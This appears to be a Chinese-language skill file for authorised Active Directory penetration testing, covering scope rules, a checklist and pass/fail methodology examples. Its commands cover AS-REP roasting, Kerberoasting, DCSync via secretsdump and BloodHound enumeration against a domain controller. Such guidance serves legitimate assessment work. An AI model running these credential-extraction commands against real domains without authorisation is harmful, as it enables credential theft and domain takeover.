
# Active Directory 攻防

## 适用场景
- 已获得书面授权，需要对域控、域成员、信任关系和高权限路径做系统性评估。
- 需要把前期枚举与后续凭据利用串起来时，可结合 [nmap](../nmap/SKILL.md) 做端口确认。
- 发现 LSASS、票据或转储痕迹后，需要与 [memory-forensics](../memory-forensics/SKILL.md) 联动还原证据链。

## 核心约束
- 只在明确授权范围内操作，禁止对未知生产域做喷洒、relay 或复制类实验。
- 先做时间同步、低噪声枚举和权限确认，再进入票据与横向移动阶段。
- 默认优先验证“是否真的具备攻击前提”，不要把 DCSync、NTDS 导出当成起手动作。
- 记录目标、账户、来源 IP、时间窗口和回滚手段。

## 代码模式
```bash
# 基础端口与域控服务确认
nmap -Pn -p 53,88,135,139,389,445,464,636,3268 10.0.0.10

# AS-REP Roasting
GetNPUsers.py corp.local/ -dc-ip 10.0.0.10 -no-pass -usersfile users.txt

# Kerberoasting
GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.10 -request
```

## 检查清单
- 确认域名、DC IP、时钟偏差和测试账户权限。
- 区分枚举、凭据获取、横向移动、持久化四个阶段的证据。
- 对每一步输出保留原始日志与命令参数。
- 高危动作前确认影响面、锁定条件和退出条件。

## 反模式

### FAIL: 不校时直接测 Kerberos

```bash
GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.10 -request
# KRB_AP_ERR_SKEW: Clock skew too great
# 客户端时间偏离 DC > 5 分钟，所有 Kerberos 操作失败
```

### PASS: 先同步时钟

```bash
ntpdate -q 10.0.0.10  # 检查偏差
sudo ntpdate 10.0.0.10  # 同步
sudo timedatectl set-timezone UTC
GetUserSPNs.py ...  # 再执行
```

### FAIL: 上来就 DCSync

```bash
secretsdump.py -just-dc corp.local/user:pass@10.0.0.10
# Access denied → 暴露了攻击意图，触发蓝队告警
# 实际：当前账户根本没有 DS-Replication-Get-Changes 权限
```

### PASS: 先验证前提

```bash
# 1. 枚举：当前账户有哪些 ACE
bloodhound-python -u user -p pass -d corp.local -c All
# 2. 只在确认有 GetChangesAll 权限的账户上执行 DCSync
# 3. 先低噪声测试一个账户，再扩大
```

### FAIL: BloodHound 路径当事实

```
"BloodHound 显示 alice → DA 路径"
→ 直接报告"已具备 Domain Admin 权限"
→ 实际：路径中某个 GenericAll 已被组策略限制
```

### PASS: 路径 = 待验证假设

```
1. 标注 BloodHound 路径为"理论可达"
2. 对每条边手工验证：实际尝试 RDP / WinRM / GenericAll 操作
3. 把"理论路径"和"已实证路径"分开报告
```
